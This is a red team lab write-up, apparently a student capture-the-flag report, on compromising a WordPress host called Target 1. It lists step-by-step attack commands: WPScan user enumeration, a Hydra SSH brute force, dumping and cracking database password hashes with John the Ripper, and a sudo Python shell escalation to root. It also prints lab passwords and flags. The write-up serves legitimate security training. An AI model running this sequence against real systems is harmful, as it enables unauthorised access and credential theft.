# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
_TODO: Fill out the information below._

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -A 192.168.1.0/24
  # TODO: Insert scan output
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/TCP Open SSH
  - Port 80/TCP Open HTTP
  - Port 111/TCP Open rcpbind
  - Port 139/TCP Open netbios-ssn
  - Port 445/TCP Open netbios-ssn

The following vulnerabilities were identified on each target:
- Target 1
  - Improper configured SSH
  - WordPress Enumation
  - Weak Password Implementation
  - No file security permission implemented
  - Use of weak password salted hashes
  - Python root escalation privileges

_TODO: Include vulnerability scan results to prove the identified vulnerabilities._

### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - **Exploits Used**
      - WPScan to enumerate users of the Target 1 WordPress site
        - wpscan --url http://192.168.1.110 --enumerate u
        - Insert Picture file
    - Targeting User Michael
      - Executed Hydra Brute Force Attack
        - The following command was performed:
        - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
        - Password: Michael
        - Insert Picture file
    - Capturing Flag 1: After SSH Brute Force Attack as Michael I traversed through directories and files.
      - Found Flag1 in  var/www/html folder at root in service.html in a HTML comment below the footer.
      - Commands:
        - ssh michael@192.168.1.110
        - pw: michael
        - cd ../
        - cd /var/www/html
        - ls -l
        - nano service.html
  - insert picture
  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Same exploit covered in flag1 to gain access
      - Commands:
        - ssh michael@192.168.1.110
        - pw: michael
        - cd ../
        - cd /var/www
        - find / i-name flag*
        - cat flag2.txt
  - insert picture
  - `flag3` : afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Previous exploit covered in flag1 and flag2
      - Captured flag3 Accessing MySQL database
        - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database
        - the wp-config.php displayed DB_Password in plaintext
        - Insert Picture
        - flag3 was found in wp_posts table in the wordpress database.
        - Commands:
          - Connected to mysql: -u root -p R@v3nSecurity
          - show databases;
          - use wordpress;
          - show tables;
          - select * from wp_posts;
    - Insert picture
  - `flag4` : 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Use of weak password salted hashes and Python root escalation privileges
      - Captured flag4 by retrieving user credentials from database, executed john the ripper to crack password hash and use Python Escalation Privileges to gain root access
        - Previously gained access to the database credentials as Michael from the sp-config.phpfile, cracking password hashes gathered from MySQL was the next step.
        - These user credentials are stored in the wp_users table of the wordpress database.
        - The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
        - Commands:
          - Connected to mysql: -u root -p R@v3nSecurity
          - SELECT ID, user_login, user_pass FROM wp_users;
    - Insert picture
        - When I exported the hashes, I saved them individually as stevenhash.txt and michaelhash.txt and ran them against John the Ripper to crack the hashes.
          - Command:
            - john stevenhash.txt
            - Insert Picture
            - john michaelhash.txt; the execution of performing the john the ripper kept on going; but we already had the password from the previous activity.
          - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
          - Command:
            - ssh steven@192.168.1.110
            - pw:pink84
            - sudo -l
            - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
            - cd /root
            - ls
            - cat flag4.txt
    - Insert Picture